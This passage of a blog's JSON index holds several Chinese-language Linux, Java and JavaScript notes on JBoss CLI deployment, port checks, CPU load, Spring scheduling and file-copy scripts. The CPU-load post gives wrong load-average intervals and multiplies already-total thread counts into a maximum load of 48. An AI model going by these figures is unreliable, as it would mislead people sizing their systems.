Jenkins\n因為是 SE 關係，所以我沒辦法看到他設定怎麼佈署\n但有時候佈署程式，需要手動上 war。\n\n最近發生怪事情，就是有時候遇到 OOM ， restart JBoss 會 failed\n然後我把 JBoss 的 `$JBOSS_HOME/standalone/config/standalone.xml`\n裡面 deployment tag 我上失敗 war 清掉\n舊可以正常打開，但是需要重新上 war 檔\n\n但最近不知道 SE ，他們 Jenkns 有調整?\n我 `$JBOSS_HOME/standalone/config/standalone.xml`\n\n### 異常事件原因\n\n最近剛好看到 JBoss-cli 這個功能，他可以遠端(Remote)佈署 war\n感覺 SE 是用這個方式佈署 war\n\n首先遠端佈署你的 JBoss Server 就要啟動(port 9990)\n\n> 難怪之前 stop JBoss Server ，用 Jenkns 佈署會失敗...\n\n在 local 端使用 $JBOSS_HOME/bin/jboss-cli.sh\n進去會看到類似 cli 指令可以輸入\n\nconnect xx.xx.xx.xx 就可以進去(沒有設定密碼，會看到 cli 介面)\n\n這時候就可以輸入 deploy xxxx.war(local) 就可以佈署 ~~其實我還沒有機會嘗試~~\n\n## 這邊疑問\n\n$JBOSS_HOME/standalone/config/standalone.xml\n\n和\n\njboss-cli deploy \n\n佈署會不會衝突? 這邊是我的猜測\n然後 $JBOSS_HOME/standalone/config/standalone.xml 裡面的 deployment\n可以看到 cli 佈署出來 war tag\n\n其實我還沒搞清楚熱佈署是什麼\n$JBOSS_HOME/standalone/deployment 其實我在懷疑這邊是不是熱佈署?\n\n為什麼正式環境改用這jboss-cli 佈署呢?\n\n## jboss-cli 指令\n\n`deployment-info `\nNAME                 RUNTIME-NAME         PERSISTENT ENABLED STATUS\njboss-ejb-in-ear.ear jboss-ejb-in-ear.ear false       true    OK\nsingleton_in_war.war singleton_in_war.war true       true    OK\n\n其中的 PERSISTENT 並沒查到是什麼意思\n目前猜測是重啟 war 是不是存在\n因為 deployment 重啟 war 檔案會重新 load 檔案樣子?\n\n### 嘗試過指令\n\n查詢目前啟動 war 狀況\n\n/deployment=*:read-attribute(name=name)\n\n這個超像 war XPath 查詢\n參考: [command line interface - JBoss 7 CLI to query all the deployed applications - Stack Overflow](https://stackoverflow.com/questions/21928887/jboss-7-cli-to-query-all-the-deployed-applications)\n\n### 其他相關指令連結\n\n* [Jboss 四種部署方法以及探討 - IT閱讀](https://www.itread01.com/p/566472.html)\n* [jboss CLI 命令行接口学习（适用JBOSS EAP 6.2+） - 菩提树下的杨过 - 博客园](https://www.cnblogs.com/yjmyzz/p/4754976.html) 詳細\n* [Jboss热部署--jboss-cli.sh指令方式_A HUGE FATTY-CSDN博客](https://blog.csdn.net/t694728793/article/details/99698846) 詳細\n* [JEAP 6 - cli 筆記](http://wei-meilin.blogspot.com/2012/11/jeap-6-cli.html)\n* [[JBoss] JBoss Deploy 讀取資料夾方式, Deploy exploded archives JBoss EAP 6 @ 瑞先生 :: 痞客邦 ::](https://luckyboy7527.pixnet.net/blog/post/116777056-%5Bjboss%5D-jboss-deploy-%E8%AE%80%E5%8F%96%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E5%BC%8F%2C-deploy-exploded-) dodeploy\n* [command line interface - JBoss 7 CLI to query all the deployed applications - Stack Overflow](https://stackoverflow.com/questions/21928887/jboss-7-cli-to-query-all-the-deployed-applications)\n* [CLI command to check deployment status in JBoss EAP - Red Hat Customer Portal](https://access.redhat.com/solutions/383573)\n\n## OOM\n\n- [【原创】一个线程oom，进程里其他线程还能运行吗？ - 孤独烟 - 博客园](https://www.cnblogs.com/rjzheng/p/9685622.html)\n\n- [线程和进程的区别是什么？ - 知乎](https://www.zhihu.com/question/25532384)\n> 進程是資源分配的最小單位，線程是CPU調度的最小單位\n\n\n彩蛋\n\n* [从 NextCloud 替换为 Seafile | zwPapEr](https://page.codespaper.com/2020/from-nextcloud-to-seafile/)\n* [syncthing/syncthing: Open Source Continuous File Synchronization](https://github.com/syncthing/syncthing)\n* [抛弃nextcloud,开始搭建使用cozycloud](https://shingle.me/post/%E6%8A%9B%E5%BC%83nextcloud%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8cozycloud/)\n這網站有趣，切換出去會跑出 `(=・ω・=) 页面崩溃啦 ~ 快回来看看~ `\n有空來研究怎麼搞出這個XD\n\n我有時間寫的話，計畫要寫 seafile docker 實作\n[Clementine 音樂播放器](https://www.clementine-player.org/zh_TW/)\n[树莓派部署 seafile 和 nextcloud 比较 - 知乎](https://zhuanlan.zhihu.com/p/140289336)\n[domenukk/seafile-docker-pi: A Docker image for Seafile server - Raspberry Pi Edition](https://github.com/domenukk/seafile-docker-pi)\n\n\n---\n\n2020-10-08 額外找的\n\n- [Sharry：一个非常好用的文件分享程序-荒岛](https://lala.im/7154.html)\n- [ResilioSync：公私兼备的同步盘-荒岛](https://lala.im/4737.html)\n- [使用Syncthing自建私有同步盘-荒岛](https://lala.im/4731.html)\n- [CozyCloud：基于GO语言开发的网盘/同步盘-荒岛](https://lala.im/4698.html)\n- [Dropit：一个简洁的文件上传工具-荒岛](https://lala.im/6617.html)\n- [开源的私有云网盘程序Seafile安装教程-荒岛](https://lala.im/671.html)","tags":["jboss"],"categories":["Java"]},{"title":"[轉]Linux 查看程式用哪些 port 方法","url":"%2Fblog%2F2020%2F09%2F28%2FLinux-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BC%8F%E7%94%A8%E5%93%AA%E4%BA%9B-port-%E6%96%B9%E6%B3%95%2F","content":"\n[linux如何查看端口被哪个进程占用 - 与f - 博客园](https://www.cnblogs.com/fps2tao/p/10042553.html)\n最近看到這篇實用\n筆記\n\n<!--more-->\n\n本文介紹linux如何查看端口被哪個進程佔用的方法：\n\n1、lsof -i:端口號\n\n\n2、netstat -tunlp|grep 端口號\n\n都可以查看指定端口被哪個進程佔用的情況\n\n【步驟一】lsof -i\n{% asset_img img1.png title %}\n\nlsof -i 用以顯示符合條件的進程情況，lsof(list open files)是一個列出當前系統打開文件的工具。以root用戶來執行lsof -i命令，如下圖\n\n【步驟二】lsof -i:端口號\n\n{% asset_img img2.png title %}\n\nlsof -i:端口號，用於查看某一端口的佔用情況，比如查看22號端口使用情況，lsof -i:22，如下圖\n\n【步驟三】netstat -tunlp\n\nnetstat -tunlp用於顯示tcp，udp的端口和進程等相關情況，如下圖\n\n{% asset_img img3.png title %}\n\n【步驟四】netstat -tunlp|grep 端口號\n\n{% asset_img img4.png title %}\n\nnetstat -tunlp|grep 端口號，用於查看指定端口號的進程情況，如查看22端口的情況，netstat -tunlp|grep 22，如下圖\n\n \n\n \n\n轉: https://jingyan.baidu.com/article/546ae1853947b71149f28cb7.html","tags":["linux"],"categories":["Linux"]},{"title":"Web 用 JavaScript 讀 TXT 檔案方法","url":"%2Fblog%2F2020%2F09%2F26%2FWeb-%E7%94%A8-JavaScript-%E8%AE%80-TXT-%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%2F","content":"\n最近簡單做了一個 web 文字模板\n其實就是簡單正規化去取代\n之前也有寫個類似東西\n但是都要大幅度去改東西\n不是很方便\n但這次主要是紀錄 js 讀/寫 txt方法\n\n<!--more-->\n\n## 讀\n\n網路上忘記從哪邊參考過來的\n其實我loadFile this抓不到原因是我呼叫方式\n事後才想到\n```js\nfunction loadFile(file) { \n    var fr=new FileReader(); \n  var that = file;\n    fr.onload=function(){ \n        console.log(fr.result);\n        // $(that).prev().val(fr.result); \n        //   chgData();\n    };\n      \n    fr.readAsText(file.files[0]); \n  \n};\n```\n\n\n## 寫\n\n我採用第一個\n\n- [我的程式學習心得: 【Javascript】匯出txt](http://tsangprogramlearning.blogspot.com/2015/01/javascripttxt.html)\n```javascript\n\nfunction saveTextAsFile( _fileName, _text ) {\n    var textFileAsBlob = new Blob([_text], {type:'text/plain'});\n\n    var downloadLink = document.createElement(\"a\");\n    downloadLink.download = _fileName;\n    downloadLink.innerHTML = \"Download File\";\n    if (window.webkitURL != null) {\n        // Chrome allows the link to be clicked\n        // without actually adding it to the DOM.\n        downloadLink.href = window.webkitURL.createObjectURL(textFileAsBlob);\n    } else {\n        // Firefox requires the link to be added to the DOM\n        // before it can be clicked.\n        downloadLink.href = window.URL.createObjectURL(textFileAsBlob);\n        downloadLink.onclick = destroyClickedElement;\n        downloadLink.style.display = \"none\";\n        document.body.appendChild(downloadLink);\n    }\n\n    downloadLink.click();\n}\n\nfunction destroyClickedElement(event) {\n    document.body.removeChild(event.target);\n}\n\n```\n\n- [html - Javascript:: export to text file - Stack Overflow](https://stackoverflow.com/questions/43135852/javascript-export-to-text-file)\n\n```js\nvar saveData = (function () {\nvar a = document.createElement(\"a\");\ndocument.body.appendChild(a);\na.style = \"display: none\";\nreturn function (data, fileName) {\n    var json = JSON.stringify(data),\n        blob = new Blob([json], {type: \"octet/stream\"}),\n        url = window.URL.createObjectURL(blob);\n    a.href = url;\n    a.download = fileName;\n    a.click();\n    window.URL.revokeObjectURL(url);\n};\n}());\n```\n\n另類寫法\n[Download text file javascript - JSFiddle - Code Playground](http://jsfiddle.net/onigetoc/ucsse0sj/)\n\n```html\n<a href=\"data:text/plain;charset=UTF-8,Hello%20World!\" download=\"hello.txt\">Download (static)</a>\n<a id=\"programatically\" href=\"\" download=\"date.txt\">Download (dynamic)</a>\n```\n\n```js\n$(\"a#programatically\").click(function(){\n    var now = new Date().toString();\n    this.href = \"data:text/plain;charset=UTF-8,\"  + encodeURIComponent(now);\n});\n```\n\n## 文件模板\n\n其實之前就有想做文件模板\n但一直都沒有什麼很好想法\n最近突然想用 js-yaml 當作設定\n簡單寫的~~爛code~~範例\n[JS Bin - Collaborative JavaScript Debugging](https://jsbin.com/jovugelala/1/edit?html,js,output)\n\njsbin 裡面存檔沒法運作，需要額外寫出來\n可以直接用這個連結使用{% asset_link jsbin.jovugelala.1.7z 簡單功能連結 %}\n\n不過未來可規劃\n\n加入 \n1. markdown-it\n2. 編輯可加入動態參數 editable\n3. 進階可加入[Template7](https://idangero.us/template7/)來做動態部分?\n4. 動態編輯輸入欄位(input date datetime-local ...等等)\n5. 桌面板快速切換工作區?\n\n但有空了解一些 js 方法\n之後再實作看看\n\n想想這些現在實力要花很多功力\n所以先做個簡單版快速使用","tags":["text"],"categories":["JavaScript"]},{"title":"Linux 怎麼看 CPU 不夠用","url":"%2Fblog%2F2020%2F09%2F24%2FLinux-%E6%80%8E%E9%BA%BC%E7%9C%8B-CPU-%E4%B8%8D%E5%A4%A0%E7%94%A8%2F","content":"\n最近看到[認識CPU | 沉迷思考的魚](http://ypk1226.com/2019/04/17/java/cpu-usage/)\n就好奇怎麼看CPU不夠力\n最後來整理一下\n\n<!--more-->\n\n相關 CPU文章\n\n1. [認識CPU | 沉迷思考的魚](http://ypk1226.com/2019/04/17/java/cpu-usage/)\n2. [理解Linux系統負荷 - 阮一峰的網絡日誌](https://www.ruanyifeng.com/blog/2011/07/linux_load_average_explained.html)\n3. [CPU的load和使用率傻傻分不清 - 昀溪 - 博客園](https://www.cnblogs.com/rexcheny/p/9382396.html)\n\n## 查詢 CPU 核心和線程\n\nLinux \n```bash\n# 查看 cpu 型號\nsudo dmidecode -s processor-version\n# 查看 cpu 個數\ngrep 'physical id' /proc/cpuinfo | sort -u | wc -l\n# 查看核心數\ngrep 'core id' /proc/cpuinfo | sort -u | wc -l\n# 查看線程數\ngrep 'processor' /proc/cpuinfo | sort -u | wc -l\n```\n\nMac\n```bash\n# 查看核心數\nsysctl hw.physicalcpu\n# 查看線程數\nsysctl hw.logicalcpu\n```\n\n## 系統負荷怎麼看\n\n系統負荷簡單就能看 CPU 能不能夠用\n\n```bash\ntop\nuptime\n```\n都可以看到 `load average: 0.09, 0.04, 0.00`\n這邊注意有三個數字，相當 5分鐘, 10 分鐘 ,15 分鐘系統負載\n我們通常注意最後一個數字(15分鐘的)\n怎樣數字能判斷?\n\n> 系統負荷的經驗法則\n> \n> 1.0是系統負荷的理想值嗎？\n> 不一定，系統管理員往往會留一點餘地，當這個值達到0.7，就應當引起注意了。經驗法則是這樣的：\n> 當系統負荷持續大於0.7，你必須開始調查了，問題出在哪裡，防止情況惡化。\n> 當系統負荷持續大於1.0，你必須動手尋找解決辦法，把這個值降下來。\n> 當系統負荷達到5.0，就表明你的系統有很嚴重的問題，長時間沒有響應，或者接近死機了。你不應該讓系統達到這個值。\n參考: [認識CPU | 沉迷思考的魚](http://ypk1226.com/2019/04/17/java/cpu-usage/)\n\n這邊要注意，這邊 1 全部是單指單核心、單一進程\n下面會講一下多線程\n\n## 多核心怎麼看系統負荷夠用?\n\n> 總核數 = 物理CPU個數 * 每個物理CPU的核心數\n> 總邏輯CPU數 = 物理CPU個數 * 每個物理CPU的核心數 * 超線程數量\n參考[CPU的load和使用率傻傻分不清 - 昀溪 - 博客園](https://www.cnblogs.com/rexcheny/p/9382396.html)\n\n簡單來看把最上面三個指令執行一下相乘後，就可以看到系統負載最大值\n\n```\n# 查看 cpu 個數\ngrep 'physical id' /proc/cpuinfo | sort -u | wc -l\n2\n# 查看核心數\ngrep 'core id' /proc/cpuinfo | sort -u | wc -l\n4\n# 查看線程數\ngrep 'processor' /proc/cpuinfo | sort -u | wc -l\n6\n```\n\n這邊相乘就是 48\n\nPS: 所以在多核心 Linux 下的 CPU 使用率超過 100% 是正常的\n\n## 實際觀察\n\n我目前某一個排程主機 Jenkins 上板會把所有排程打開，這樣會有一個嚴重問題，當下記憶體、CPU 過重\n需要人工去開啟未成功排程\n最近看了這篇文章\ntop 指令當下是\n\n{% asset_img img1.jpg 系統負載 %}\n\n這邊也有看到文章說 5分鐘系統負載持續飆高 後面 10,15 分鐘的系統將會持續飆高\n所以系統負載會不會好轉，可以從這邊看出來\n\n然後在系統負載小於 48 時候，我在 2x 開啟排程都能順利執行\n\n\n## 番外篇 記憶體怎麼看\n\n之前我在玩樹梅派開很久會發現我 RAM 怎麼沒有降下去\n後來看鳥哥文章看到 Linux RAM 不會馬上釋放掉\n之後有看到文章說 swap 吃太多的時候，就要考慮到是不是記憶體不足?\n有想到再補\n\n[手動清除 Linux 記憶體快取. /proc/sys/vm/drop_caches | by Yu-Hsin Hung | Hungys.blog() | Medium](https://medium.com/hungys-blog/clear-linux-memory-cache-manually-90bec95ea003)\n[尋找當下 Linux OS 效能瓶頸 - Phil Workspace](https://blog.pichuang.com.tw/20200307-performance-collection/)","tags":["cpu"],"categories":["Linux"]},{"title":"Spring Boot TaskScheduler 簡單實作起手勢","url":"%2Fblog%2F2020%2F09%2F14%2FSpring-Boot-TaskScheduler-%E7%B0%A1%E5%96%AE%E5%AF%A6%E4%BD%9C%E8%B5%B7%E6%89%8B%E5%8B%A2%2F","content":"\n最近看到 Spring Boot TaskScheduler 簡單的範例\n就簡單實作\n沒想到這麼簡單\n\n<!--more-->\n\n## 簡單實作\n\n\n1.  @EnableScheduling\n在 @SpringBootApplication 下面配置 @EnableScheduling\n\n2.  配置 Task 類別\n\n```java\n@Component\npublic class ScheduledTask {\n\n    private static final SimpleDateFormat dateFormat = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n    private Integer count0 = 1;\n    private Integer count1 = 1;\n    private Integer count2 = 1;\n\n    @Scheduled(fixedRate = 5000)\n    public void reportCurrentTime() throws InterruptedException {\n        System.out.println(String.format(\"---第%s次執行，當前時間為：%s\", count0++, dateFormat.format(new Date())));\n    }\n\n    @Scheduled(fixedDelay = 5000)\n    public void reportCurrentTimeAfterSleep() throws InterruptedException {\n        System.out.println(String.format(\"===第%s次執行，當前時間為：%s\", count1++, dateFormat.format(new Date())));\n    }\n\n    @Scheduled(cron = \"0 0 1 * * *\")\n    public void reportCurrentTimeCron() throws InterruptedException {\n        System.out.println(String.format(\"+++第%s次執行，當前時間為：%s\", count2++, dateFormat.format(new Date())));\n    }\n\n}\n```\n參考: [基於Spring Boot 實現定時任務-springboot,java,spring 相關文章-天碼營](https://www.tianmaying.com/tutorial/spring-scheduling-task)\n\n這邊有趣的是 cron 這邊有到秒\n然後這邊程式是用單線程\n所以前一個超過時間就不會執行(我看到文章是這樣寫)\n這邊就不敘述，因為我也不是很懂\n\n## 相關文章\n\n* [27. Task Execution and Scheduling](https://docs.spring.io/spring/docs/3.2.x/spring-framework-reference/html/scheduling.html)\n* [【小家Spring】Spring任务调度@Scheduled的使用以及原理、源码分析（@EnableScheduling）_YourBatman-CSDN博客](https://blog.csdn.net/f641385712/article/details/89442241)\n* [Spring Scheduler的使用与坑 | 懒程序员改变世界](http://qinghua.github.io/spring-scheduler/)\n* [SpringBoot中使用任务调度器的注意事项](http://betterlxc.com/2017/09/SpringBoot%E4%B8%AD%E4%BD%BF%E7%94%A8%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E5%99%A8%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/)\n* [Spring Schedule Tutorial · Burak Aktas](http://buraktas.com/spring-schedule-tutorial/)\n* [How to Schedule Tasks with Spring Boot | CalliCoder](https://www.callicoder.com/spring-boot-task-scheduling-with-scheduled-annotation/)\n* [java - Spring Boot Shutdown with Scheduler - Stack Overflow](https://stackoverflow.com/questions/41903782/spring-boot-shutdown-with-scheduler)\n* [基於Spring Boot 實現定時任務-springboot,java,spring 相關文章-天碼營](https://www.tianmaying.com/tutorial/spring-scheduling-task)\n* [分布式任务调度平台XXL-JOB](https://www.xuxueli.com/xxl-job/#5.4.1%20quartz%E7%9A%84%E4%B8%8D%E8%B6%B3)\n* [在Spring Boot中优雅的实现定时任务 - 知乎](https://zhuanlan.zhihu.com/p/79644891)\n* [数据批处理神器-Spring Batch(1)简介及使用场景 | mason's blog](https://mianshenglee.github.io/2019/06/04/springbatch(1).html)\n* [动态改变Spring定时任务执行频率-阿里云开发者社区](https://developer.aliyun.com/article/488617)\n* [Springboot定时任务踩坑记录 - 技术杂谈 - SegmentFault 思否](https://segmentfault.com/a/1190000018707820)\n* [Shutdown a Spring Boot Application | Baeldung](https://www.baeldung.com/spring-boot-shutdown)\n\nSpring Batch 跟 Spring Boot Task 是不一樣東西...\n\n\n## 問題\n\n我在想程是執行中那要怎麼關閉程式呢?\n我想改一個方法就要把所有程式關掉\n這樣執行中程式不是就會有問題\n\n不過，也有可能 Spring Boot Task 應該只要放一個任務工作程式就沒這個問題?\n但實務上是不是這樣做就不知道了\n","tags":["taskscheduler"],"categories":["Java"]},{"title":"expect 和 yes 自動化工具","url":"%2Fblog%2F2020%2F09%2F13%2Fexpect-%E5%92%8C-yes-%E8%87%AA%E5%8B%95%E5%8C%96%E5%B7%A5%E5%85%B7%2F","content":"\n最近看到有趣小工具\n有點像 Linux 自動化工具\n這邊小記一下\n\n<!--more-->\n\n## yes\n\n- [utilities - What is the point of the `yes` command? - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/102484/what-is-the-point-of-the-yes-command)\n\n- [Linux yes Command Tutorial for Beginners (with Examples)](https://www.howtoforge.com/linux-yes-command/)\n\nyes | rm -r large_directory\n\nyes | fsck /dev/foo\n\n## expect\n\n- [linux expect详解(ssh自动登录) - 懒惰的肥兔 - 博客园](https://www.cnblogs.com/lzrabbit/p/4298794.html)\n\n也有查 window 能跑 expect 方法\n\n- [Windows上安装配置SSH教程（5）——win10下使用Cygwin+Expect自动登陆ssh - feipeng8848 - 博客园](https://www.cnblogs.com/feipeng8848/p/8559773.html)\n\n\n原本想簡單使用，但後來最近發太多文章\n然後目前這個應該還用不太到\n有用過再紀錄\n\n不過自動化學習工具應該使用 Ansible 感覺會比較好","tags":["yes"],"categories":["Linux"]},{"title":"Linux cp 快速複製目的不存在資料夾方法","url":"%2Fblog%2F2020%2F09%2F11%2FLinux-cp-%E5%BF%AB%E9%80%9F%E6%96%B0%E5%A2%9E%E7%9B%AE%E7%9A%84%E4%B8%8D%E5%AD%98%E5%9C%A8%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E6%B3%95%2F","content":"\n之前就有在查類似指令\n但沒有覺得很快速方法\n這邊先整理\n\n<!--more-->\n\n## mac cp --parents\n\n可用這個指令解決我需求問題\n但我沒 mac QQ\n\n## mkdir -p\n\n平常我快速建置資料夾\nmkdir -p `dirname /xxxx/xx/x/x/x/x/filename`\ncp xxx /xxxx/xx/x/x/x/x/filename\n\n但數量越多，這樣做也不會比較快\n\n## cp-p SOURCE... DIRECTORY/\n\n```bash\ncp-p() {\n  last=${@: -1}\n\n  if [[ $# -ge 2 && \"$last\" == */ ]] ; then\n    # cp SOURCE... DEST/\n    mkdir -p \"$last\" && cp \"$@\"\n  else\n    echo \"cp-p: (copy, creating parent dirs)\"\n    echo \"cp-p: Usage: cp-p SOURCE... DEST/\"\n  fi\n}\n```\n\n但這樣改從清單還要多一層處理目的資料夾\n我覺得不是很實用\n\n## install -D\n\ninstall -D test1.sh ./xxx/test.sh      \n\n~~但不確定什麼問題，沒選出最佳答案~~\n\n### install 指定清單做複製方法\n\n最近因為專案是用 SVN\n但包檔要給客戶需要包成zip\n這邊有時候從 SVN 去看目錄手動複製真的很麻煩\n尤其還要對 class去做複製\n\n今天寫了好用腳本\nWindows 10 直接用 WSL 也可以操作\n```bash\n#!/bin/bash\n# 包版日期\nDAYV=\"201113\"\n# 包版版本\nVERSION=\"002\"\n\n# 有針對資料夾和檔案都可以做複製\n# 萬用字玩也可以\n# 找不檔案也不會有問題\nSPATHLIST=(\n# #SHARE\n./web/build/classes/aa\n./web/build/classes/aa/\n# BATCH\n./TEST\n./batch/src/com/abc/batch/Aaaaa.java\n./batch/src/com/abc/batch/schedule/job/*\n# bin, class\n./batch/bin/com/abc/batch/Aaaaa.class\n)\n\n# install 資料夾複製方法參考\n# https://unix.stackexchange.com/questions/165463/problem-with-install-command-to-copy-a-whole-directory\n\nDPATH=\"/CodePackage/${DAYV}/${VERSION}/${DAYV}_code_package\"\n\nlength=${#SPATHLIST[@]}\nfor(( j=0; j<$length; j++ ))\ndo\n\tif [[ ! -e \"${SPATHLIST[$j]}\" ]]; then # 檢查檔案 https://linuxize.com/post/bash-check-if-file-exists/\n\t\techo \"${SPATHLIST[$j]}找不到檔案檔案\"\n\t\tcontinue\n\tfi\n\tif [[ -d \"${SPATHLIST[$j]}\" ]]; then\n    # 加入 exec 印出內容\n\t\t# https://askubuntu.com/questions/651315/how-do-you-output-the-filename-in-find-command-while-using-exec\n\t\tfind \"${SPATHLIST[$j]}\" -type f -printf '%p\\n' -exec install -D  \"{}\" \"${DPATH}/{}\" \\;\n\telse\n\t\tinstall -D ${SPATHLIST[$j]} ${DPATH}/${SPATHLIST[$j]}\t\n\tfi\n\techo \"${SPATHLIST[$j]} 成功搬移 ${DPATH}/${SPATHLIST[$j]}\"\ndone\n\ncp ./copyfiles.sh ${DPATH}/../copyfiles${DAYV}${VERSION}.sh\n\n# 寫更版紀錄 txt\nTXT_FILE=\"更版紀錄_${DAYV}_${VERSION}.txt\"\nTXT_FILEPATH=${DPATH}/${TXT_FILE}\n\necho \"<${DAYV}_${VERSION}> #\" > ${TXT_FILEPATH}\necho \"\" >> ${TXT_FILEPATH}\necho \"Revision: >>>>>> (Beta${VERSION})\" >> ${TXT_FILEPATH}\necho \"Author: xxx\" >> ${TXT_FILEPATH}\necho \"Date: $(date +\"%Y年%m月%d日 %T\")\" >> ${TXT_FILEPATH}\necho \"\" >> ${TXT_FILEPATH}\necho \" #>>>>>>\" >> ${TXT_FILEPATH}\necho \"\" >> ${TXT_FILEPATH}\necho \"【問題說明】\" >> ${TXT_FILEPATH}\necho \"     >>>>>>\" >> ${TXT_FILEPATH}\necho \"【處理說明】\" >> ${TXT_FILEPATH}\necho \"     >>>>>>\" >> ${TXT_FILEPATH}\necho \"     \" >> ${TXT_FILEPATH}\necho \"\"  >> ${TXT_FILEPATH}\necho \"相關程式如下：\"  >> ${TXT_FILEPATH}\necho \"\"  >> ${TXT_FILEPATH}\nfor(( j=0; j<$length; j++ ))\ndo\n\tlet INDEX=$j+1\n\techo \"${INDEX}.\" \"${SPATHLIST[$j]}\"  >> ${TXT_FILEPATH}\ndone\n\n# 產生 password txt(為了手動包 zip用的)\n# 因為客戶需要更版紀錄，我需要去 Mantis 複製內容再zip\n echo \"pwd20\"${DAYV} >  ${DPATH}/../password.txt\n\n```\n\n這樣半自動化，相信能減少很多出錯","tags":["cp"],"categories":["Linux"]},{"title":"Linux 執行多個目錄全部指令方法","url":"%2Fblog%2F2020%2F09%2F11%2FLinux-%E5%9F%B7%E8%A1%8C%E5%A4%9A%E5%80%8B%E7%9B%AE%E9%8C%84%E5%85%A8%E9%83%A8%E6%8C%87%E4%BB%A4%E6%96%B9%E6%B3%95%2F","content":"\n最近抓取一些專案\n需要執行 mvn install\n但是非常多專案\n在想有什麼快速方法(雖然已經手動執行完了)\n\n<!--more-->\n\n最近看到[Linux 執行目錄下所有 Script](https://www.opencli.com/linux/linux-run-all-scripts-in-directory)可以解決我的需求\n就嘗試看看\n\n## run-parts\n\nrun-parts 就是執行當下所有目錄的程式，這之前在 crontab 有看到\n但沒有仔細去研究\n\n```sh\nrun-parts –regex '.*sh$' /home/pi/shell/\n```\n\n### 預設抓取檔案\n\n```\nrun-parts  --list  /home/malagege/run-parts\n/home/malagege/run-parts/test\n```\n所以記得要寫 regex\n\n### 相關文章\n\n- [如何將目錄下的腳本一次性全部執行 - 良許Linux - 博客園](https://www.cnblogs.com/yychuyu/p/12983328.html)\n- [Linux之 run-parts 命令的用法及原理_一次次尝试-CSDN博客](https://blog.csdn.net/WYpersist/article/details/80246860)\n- [run-parts/run-parts at master · ikysil/run-parts](https://github.com/ikysil/run-parts/blob/master/run-parts)\n- [請問 \"run-parts\" 這指令](http://phorum.study-area.org/index.php?topic=16017.0)\n這邊有提到順序\n> 以 file name 字母順序來排：\n> ls /path/to/dir | sort\n- [Fix \"Exec format error\" When Running Scripts With run-parts Command](https://ostechnix.com/fix-exec-format-error-when-running-scripts-with-run-parts-command/)\n> #!/usr/bin/python3\n> We can use:\n> #!/usr/bin/env python3\n\n\n## find\n\n這個可能適合用在我的需求\n\n```bash\nfind /home/pi/shell/ -maxdepth 1 -type f -executable -name '*.sh' -exec {} \\;\n```\n\n改寫\n\n -executable 需要拿掉，這個是抓可執行的檔案\n\n```bash\nfind . -maxdepth 2 -type f -executable -name 'composer.json' -exec composer update  \\;\n```\n\n卻不能跑\n\n後面改成 -exec pwd \\;\n發現路徑是第一層路徑\n\n### 使用 execdir\n\n```bash\nfind . -maxdepth 2 -type f  -name 'composer.json' -execdir  composer update  \\;\n```\n\n[应该在find命令中使用-execdir代替-exec_一程山水一程歌-CSDN博客](https://blog.csdn.net/Qidi_Huang/article/details/53388589)\n\n\n### 搬檔案可參考\n\n```\nrsync -a --remove-source-files SOURCEDIR /mnt/TARGETDIR/\n```\n\n[如何在 Linux 搬動資料夾與其所有檔案到另一個同名資料夾 | The Will Will Web](https://blog.miniasp.com/post/2021/06/25/Move-folder-and-files-to-same-folder-name-on-another-disk?fbclid=IwAR33EHmCeKLFk8CC1Tlr-i2gsWEb-WZP1RGH2wVHNMoWPJT7PNjFvKtei_c)\n","tags":["shell"],"categories":["Linux"]},{"title":"Linux/Windows 執行腳本抓取當前腳本路徑方法","url":"%2Fblog%2F2020%2F09%2F10%2FLinux-Windows-%E5%9F%B7%E8%A1%8C%E8%85%B3%E6%9C%AC%E6%8A%93%E5%8F%96%E7%95%B6%E5%89%8D%E8%85%B3%E6%9C%AC%E8%B7%AF%E5%BE%91%E6%96%B9%E6%B3%95%2F","content":"\n我們很長寫腳本，在任意A目錄當執行`不同的B目錄`的腳本抓取路徑是A\n但實務上有時候希望抓到B目錄\n最近在想這個有什麼方法\n\n<!--more-->\n\n## Linux\n\n以下都是參考:[Shell Script 取得 Script 所在目錄位置](https://www.opencli.com/linux/shell-script-get-script-location)\n\n### 不嚴謹\n\n```bash\n#!/usr/bin/sh\n\necho $0 \n```\n\n但某時候會遇到問題\n如./test.sh\n\n這樣就會抓出 ./test.sh\n\n參考:[Shell Script 取得 Script 所在目錄位置](https://www.opencli.com/linux/shell-script-get-script-location)\n\n### 嚴謹\n\n```bash\n#!/usr/bin/sh\nget_script_dir () {\n     SOURCE=\"${BASH_SOURCE[0]}\"\n     # While $SOURCE is a symlink, resolve it\n     while [ -h \"$SOURCE\" ]; do\n          DIR=\"$( cd -P \"$( dirname \"$SOURCE\" )\" && pwd )\"\n          SOURCE=\"$( readlink \"$SOURCE\" )\"\n          # If $SOURCE was a relative symlink (so no \"/\" as prefix, need to resolve it relative to the symlink base directory\n          [[ $SOURCE != /* ]] && SOURCE=\"$DIR/$SOURCE\"\n     done\n     DIR=\"$( cd -P \"$( dirname \"$SOURCE\" )\" && pwd )\"\n     echo \"$DIR\"\n}\necho \"$(get_script_dir)\"\n```\n\n參考:[Shell Script 取得 Script 所在目錄位置](https://www.opencli.com/linux/shell-script-get-script-location)\n\n## windows\n\n最近有時候會接觸到 BAT腳本\n一樣也是遇到一樣問題\n不同的是有分 C / D 曹\n在不同地方處理更是麻煩\n需要切換`C:`或`D:`\n\n如:\n```bat\nD:\ncd \"D:xxx\"\nDIR /S /A:-D /B /O:N >list.txt\n```\n\n解決方法\n\n```bat\n@echo ===============================================\n:: 切換到腳本所在的目錄\nset WORK_DIR=%~dp0\necho Switch to %WORK_DIR%\ncd /d %WORK_DIR%\necho %cd%\n@echo ===============================================\n::...加上自己 script\n```\n參考:[windows下bat批處理中%和%~dp0的區別_菜鳥攻城獅-CSDN博客](https://blog.csdn.net/qq981378640/article/details/52980741)\n\n- [快閃人生: 【批次檔】%CD% 與 %~dp0](http://inpega.blogspot.com/2012/07/cd-dp0.html)\n- [linux獲取當前腳本的絕對路徑 | aimuke](https://aimuke.github.io/linux/2019/04/29/how-to-get-abusolute-path/)\n\n\n## 